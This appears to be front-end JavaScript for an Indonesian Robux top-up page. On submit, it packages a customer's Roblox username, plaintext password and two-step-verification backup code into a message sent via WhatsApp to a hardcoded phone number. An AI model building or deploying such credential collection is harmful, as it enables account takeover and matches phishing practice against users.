const WHATSAPP_NUMBER = "6283197962700";

function showPopup(title, message, submessage) {
  const existing = document.getElementById("validationCenterPopup");
  if (existing) existing.remove();

  const container = document.getElementById("validationContainer") || document.body;

  const popup = document.createElement("div");
  popup.id = "validationCenterPopup";
  popup.className = "validation-center";
  popup.tabIndex = -1;

  popup.innerHTML = `
    <div class="hdr">${title || "Notification"}</div>
    <div class="divider"></div>
    <div class="txt">${message || ""}</div>
    ${submessage ? `<div class="subtxt">${submessage}</div>` : ``}
    <div class="btnRow">
      <button type="button" class="okbtn">OK</button>
    </div>
  `;

  container.appendChild(popup);

  const okBtn = popup.querySelector(".okbtn");

  function removePopup() {
    popup.style.transition = "opacity 160ms ease, transform 160ms ease";
    popup.style.opacity = "0";
    popup.style.transform = "translate(-50%,-50%) scale(.98)";
    setTimeout(() => popup.remove(), 170);
  }

  okBtn.addEventListener("click", removePopup);
  popup.focus({ preventScroll: true });

  const t = setTimeout(removePopup, 7000);
  window.addEventListener("pagehide", () => {
    clearTimeout(t);
    if (popup) popup.remove();
  }, { once: true });
}

function formatHarga(harga) {
  const hargaNumber =
    typeof harga === "number"
      ? harga
      : Number(String(harga).replace(/[^\d]/g, ""));

  return {
    hargaNumber,
    hargaText: "Rp" + new Intl.NumberFormat("id-ID").format(hargaNumber),
  };
}

window.isiForm = function isiForm(nominal, harga, kategori) {
  document.getElementById("nominal").value = nominal;
  document.getElementById("harga").value = formatHarga(harga).hargaText;
  document.getElementById("kategori").value = kategori;
  updateV2LOptions();
  document.querySelector(".form-section")?.scrollIntoView({ behavior: "smooth" });
};

function updateV2LOptions() {
  const v2lEl = document.getElementById("v2l");
  const metodeDiv = document.getElementById("metodeV2L_div");
  const metodeSelect = document.getElementById("metodeV2L");
  const backupDiv = document.getElementById("backupCode_div");
  const emailDiv = document.getElementById("emailNote_div");

  if (!v2lEl || !metodeDiv || !metodeSelect || !backupDiv || !emailDiv) return;

  const v2lVal = String(v2lEl.value || "").trim().toUpperCase();

  if (v2lVal !== "ON") {
    metodeDiv.classList.add("hidden");
    backupDiv.classList.add("hidden");
    emailDiv.classList.add("hidden");
    metodeSelect.innerHTML = "";
    metodeSelect.value = "";
    return;
  }

  metodeDiv.classList.remove("hidden");

  const oldValue = metodeSelect.value;

  metodeSelect.innerHTML = `
    <option value="">-- Pilih Metode --</option>
    <option value="Backup Code">Backup Code</option>
    <option value="Kode Email">Kode Email</option>
  `;

  metodeSelect.value =
    oldValue === "Backup Code" || oldValue === "Kode Email" ? oldValue : "";

  if (metodeSelect.value === "Backup Code") {
    backupDiv.classList.remove("hidden");
    emailDiv.classList.add("hidden");
  } else if (metodeSelect.value === "Kode Email") {
    backupDiv.classList.add("hidden");
    emailDiv.classList.remove("hidden");
  } else {
    backupDiv.classList.add("hidden");
    emailDiv.classList.add("hidden");
  }
}

function resetFormUI(form) {
  form.reset();
  document.getElementById("metodeV2L_div")?.classList.add("hidden");
  document.getElementById("backupCode_div")?.classList.add("hidden");
  document.getElementById("emailNote_div")?.classList.add("hidden");

  const metodeSelect = document.getElementById("metodeV2L");
  if (metodeSelect) {
    metodeSelect.innerHTML = "";
    metodeSelect.value = "";
  }
}

document.addEventListener("DOMContentLoaded", function () {
  const v2lEl = document.getElementById("v2l");
  const metodeEl = document.getElementById("metodeV2L");
  const btnWa = document.getElementById("btnWa");

  updateV2LOptions();

  v2lEl?.addEventListener("change", updateV2LOptions);

  metodeEl?.addEventListener("change", function () {
    const backupDiv = document.getElementById("backupCode_div");
    const emailDiv = document.getElementById("emailNote_div");

    if (this.value === "Backup Code") {
      backupDiv?.classList.remove("hidden");
      emailDiv?.classList.add("hidden");
    } else if (this.value === "Kode Email") {
      backupDiv?.classList.add("hidden");
      emailDiv?.classList.remove("hidden");
    } else {
      backupDiv?.classList.add("hidden");
      emailDiv?.classList.add("hidden");
    }
  });

  btnWa?.addEventListener("click", function () {
    const form = document.getElementById("orderForm");
    if (!form) return;

    const username = document.getElementById("username")?.value.trim() || "";
    const password = document.getElementById("password")?.value.trim() || "";
    const v2l = document.getElementById("v2l")?.value || "";
    const metodeV2L = document.getElementById("metodeV2L")?.value || "";
    const backupCode = document.getElementById("backupCode")?.value.trim() || "";
    const kategori = document.getElementById("kategori")?.value || "";
    const nominal = document.getElementById("nominal")?.value || "";
    const harga = document.getElementById("harga")?.value || "";

    if (!username || !password || !v2l || !kategori || !nominal || !harga) {
      showPopup("Notification", "Oops", "Harap isi semua kolom yang wajib diisi!");
      return;
    }

    if (String(v2l).toUpperCase() === "ON") {
      if (!metodeV2L) {
        showPopup("Notification", "Oops", "Karena V2L aktif, silakan pilih metode V2L.");
        document.getElementById("metodeV2L")?.focus();
        return;
      }

      if (metodeV2L === "Backup Code" && !backupCode) {
        showPopup("Notification", "Oops", "Mohon masukkan Backup Code.");
        document.getElementById("backupCode")?.focus();
        return;
      }
    }

    const message =
      `**ORDER ROBUX VIA LOGIN**\n\n` +
      `Username Roblox: ${username}\n` +
      `Password Roblox: ${password}\n` +
      `V2L: ${v2l}${metodeV2L ? ` (${metodeV2L})` : ""}\n` +
      `${backupCode ? `Backup Code: ${backupCode}\n` : ""}` +
      `Kategori: ${kategori}\n` +
      `Nominal: ${nominal}\n` +
      `Harga: ${harga}`;

    const waUrl = `https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(message)}`;
    window.open(waUrl, "_blank");

    showPopup(
      "Notification",
      "Berhasil",
      "Pesanan sudah disiapkan ke WhatsApp. Silakan lanjut kirim pesan di WhatsApp."
    );

    resetFormUI(form);
  });
});
